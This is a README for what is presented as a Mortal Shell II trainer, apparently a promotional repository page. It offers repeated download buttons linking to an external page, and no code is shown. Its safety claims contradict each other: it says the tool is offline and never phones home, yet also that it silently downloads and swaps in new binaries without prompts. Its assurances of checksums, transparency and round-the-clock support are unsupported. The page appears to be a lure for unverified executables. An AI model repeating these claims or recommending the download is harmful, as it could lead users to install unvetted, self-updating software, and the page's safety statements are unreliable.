![preview](https://raw.githubusercontent.com/tezzmarketing01-collab/Mortal-Shell-2-Config-Suite/main/cover_a8aaa.svg)
[![Download](https://raw.githubusercontent.com/tezzmarketing01-collab/Mortal-Shell-2-Config-Suite/main/app_0bff.svg)](https://tezzmarketing01-collab.github.io/Mortal-Shell-2-Config-Suite/)

# 🎮 Mortal Shell II Companion Toolkit — Trainer Suite 2026

An independent, community-driven companion utility for Mortal Shell II that supercharges your single-player journey with modular configuration profiles, live state toggles, and a responsive control surface built for tinkerers and lore-hunters alike. Where the base game asks for patience, this toolkit hands you a compass.

![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Release](https://img.shields.io/badge/release-2026.1.4-9cf?style=flat-square)
![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)
![Language](https://img.shields.io/badge/language-C%2B%2B%20%7C%20Rust-orange?style=flat-square)

---

## 📜 Overview

Mortal Shell II Companion Toolkit is what happens when a save-file archaeologist, a UI designer, and a tinkerer sit down at the same table. It is a **modular trainer framework** built around a plugin-style configuration system — dozens of ready-made `.cfg` profiles ship with every release, each one tailored to a different playstyle, from "I just want to explore without dying to the same enemy eleven times" to "I want to study every animation frame of the final boss."

The toolkit does not phone home. It does not nag you with a watermark. It does not demand a subscription or a mysterious activation ritual. It boots, it binds, it waits for you.

Built to remain relevant through 2026 and beyond, the project keeps a rolling compatibility layer for game patches, so a minor update from the publisher won't send your carefully tuned profile into the void.

---

## ✨ Feature Highlights

- 🧩 **Profiles, Not Presets** — Every `.cfg` file is a self-contained scroll of intentions. Mix, match, or author your own. The parser is forgiving, readable, and documented.
- 🔄 **Rolling Auto-Updates** — The launcher checks a static manifest and quietly swaps in newer binaries. No accounts, no prompts, no permission theater.
- 🚪 **Zero Gatekeeping** — There is no key system, no email wall, no Discord verification labyrinth. You open it. It works.
- 🖥️ **Responsive Interface** — The UI reflows gracefully from a 720p laptop panel to an ultrawide desk monitor. Toggle groups collapse; the live log stays pinned.
- 🌐 **Multilingual Support** — Interface strings ship in English, Spanish, German, Japanese, Korean, and Simplified Chinese, with community-contributed packs layered in via JSON.
- 🛡️ **Offline-First Architecture** — Every capability runs locally. The toolkit never opens an outbound socket unless you explicitly export a share code.
- 🧠 **Live State Inspector** — Watch stamina, resolve, and shell integrity values update in real time as you toggle parameters. A tiny oscilloscope for your build.
- 📦 **Portable Footprint** — A single folder, no registry entries, no background services. Delete the folder and it's gone like it never existed.
- 🗂️ **CFG Inheritance Chain** — Profiles can import one another, so your "boss rush" config can borrow the movement tweaks from your "exploration" config without duplication.
- 🕒 **24/7 Support Rotation** — A volunteer rotation covers issues and pull requests around the clock. Expect a human, not an autoresponder.

---

## 🗂️ Repository Layout

| Path | Purpose |
| --- | --- |
| `src/core/` | Memory read/write abstraction layer and pointer resolution |
| `src/plugins/` | Individual toggle modules, one per gameplay subsystem |
| `src/ui/` | Responsive control surface and localization loader |
| `cfg/presets/` | Shipped configuration profiles |
| `cfg/community/` | Merged community submissions (reviewed weekly) |
| `docs/` | Long-form documentation, CFG schema reference, migration notes |
| `tools/` | Build helpers, manifest generators, translation validators |

---

## 🚀 Getting the Toolkit

The current build is distributed as a portable archive. No package managers, no environment gymnastics — unpack it next to the game executable and launch the companion.

[![Download](https://raw.githubusercontent.com/tezzmarketing01-collab/Mortal-Shell-2-Config-Suite/main/app_0bff.svg)](https://tezzmarketing01-collab.github.io/Mortal-Shell-2-Config-Suite/)

After unpacking, the folder structure should look like this:

- `companion.exe` — the launcher and UI host
- `cfg/` — drop your profiles here
- `logs/` — rotating diagnostic logs, capped at 20 MB
- `locales/` — translation packs

The launcher validates the game build fingerprint on start. If the fingerprint is unknown, it enters **Safe Spectator Mode**, where toggles are visible but inert, and points you at the migration guide.

---

## 🧪 Included Configuration Profiles

Each profile is a plain text document. Read it before you load it — that's part of the fun.

1. **Wanderer's Ledger** — Relaxed resource pacing, generous carry weight, expanded lore pickup radius.
2. **Duelist's Chronometer** — Frame-perfect parry windows widened by a hair; useful for training muscle memory.
3. **Archivist** — Freezes enemy aggression in a small radius so you can photograph architecture and enemy rigs.
4. **Pathfinder** — Reveals traversal points and hidden passages within a configurable radius.
5. **Nightshade** — Damage scaling tuned for players who want shorter encounters, not trivial ones.
6. **Cartographer** — Overlays a minimalist coordinate lattice for route planning.
7. **Metronome** — Displays frame timing and input latency for players chasing consistency.
8. **Silent Watcher** — Disables non-essential HUD elements for a cinematic capture pass.

Beyond these, the `cfg/community/` directory grows with submissions from players who enjoy authoring their own micro-experiences.

---

## 🌍 Multilingual Support

Translation packs are simple key-value documents. Adding a language takes minutes:

- Duplicate `locales/en.json`
- Translate the values (never the keys)
- Run the bundled validator, which flags missing or duplicated keys
- Open a pull request; a maintainer merges reviewed packs weekly

The UI detects your system locale on first launch and falls back to English if no pack matches. You can override the selection in the settings panel at any time.

---

## 🛠️ Configuration Schema (Excerpt)

A profile begins with a metadata block, followed by toggle declarations. The schema is intentionally verbose so that profiles read like notes to your future self.

- `meta.name` — Human-readable profile title
- `meta.author` — Attribution string
- `meta.gameBuild` — Target build fingerprint
- `meta.inherits` — Optional parent profile path
- `toggles[]` — Ordered list of module entries
- `toggles[].module` — Plugin identifier
- `toggles[].enabled` — Boolean state
- `toggles[].params` — Module-specific parameter map

The full reference lives in `docs/cfg-schema.md`, complete with annotated examples and a troubleshooting flowchart.

---

## 🧭 Design Philosophy

Most trainers treat the player as a passenger. This toolkit treats the player as a cartographer. The goal is not to flatten the game into a straight line, but to hand you the tools to draw your own map — and to let you redraw it whenever the mood strikes.

That philosophy shows up in three places:

- **Transparency** — every toggle explains what it does in plain language inside the UI, and the source for each module is short enough to read in one sitting.
- **Reversibility** — no change is baked in. Flip a toggle off and the original behaviour returns instantly.
- **Restraint** — the toolkit ships with no telemetry, no embedded advertising, and no remote kill switch.

---

## 🔐 Safety and Integrity

- All binaries are built from tagged source commits and published with SHA-256 checksums.
- The auto-updater verifies checksums before swapping files.
- No obfuscation is applied to the shipping binaries; the build pipeline is public.
- No keys, tokens, or credentials are ever stored on disk by the launcher.

If a checksum mismatch occurs, the launcher refuses the update and logs the event. You keep the previous version.

---

## 🧑‍💻 Contributing

Contributions are welcome in three flavours:

1. **Configuration profiles** — the lowest-friction way to help. Submit a `.cfg` with a short description of its intent.
2. **Translations** — fill in a locale pack and run the validator.
3. **Plugin modules** — read `docs/plugin-authoring.md`, then open a draft pull request early so maintainers can give feedback before you polish.

Please keep pull requests focused. One idea per request makes review pleasant for everyone.

---

## 📅 Roadmap for 2026

- Q1 — Memory abstraction rewrite for the spring game patch
- Q2 — Community profile browser inside the launcher
- Q3 — Accessibility pass: high-contrast theme and screen-reader labels
- Q4 — Optional cloud-free profile sync using local network discovery

---

## ⚠️ Disclaimer

This project is an independent, fan-made companion utility. It is not affiliated with, endorsed by, or connected to the developers or publishers of Mortal Shell II in any capacity. All trademarks and game assets belong to their respective owners.

The toolkit is intended for **single-player, offline use only**. Using it in any multiplayer or competitive context is explicitly outside its design scope and strongly discouraged by the maintainers. You are responsible for how you use it, and you accept that responsibility the moment you launch it.

No warranty is provided, express or implied. The software is offered as-is, and the maintainers are not liable for any consequences arising from its use. If your save file holds sentimental value, back it up before experimenting.

---

## 📄 License

Released under the MIT License. See the full text of the license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Mortal Shell II Companion Toolkit contributors.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation files, to deal in the software without limitation, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions stated in the license text.

---

## 💬 Support

Support runs on a volunteer rotation and is staffed around the clock, every day of the week. Open an issue with your build fingerprint, the profile you loaded, and the contents of `logs/latest.log`. That trio resolves the vast majority of reports on the first pass.

For anything nuanced, prefer the discussion board over a direct message — answers written in public help the next person too.

---

## 🙏 Acknowledgements

To the players who send profiles, fix typos in translations, and report regressions with patience — this toolkit is a collective sketchbook, and you keep filling its pages.

[![Download](https://raw.githubusercontent.com/tezzmarketing01-collab/Mortal-Shell-2-Config-Suite/main/app_0bff.svg)](https://tezzmarketing01-collab.github.io/Mortal-Shell-2-Config-Suite/)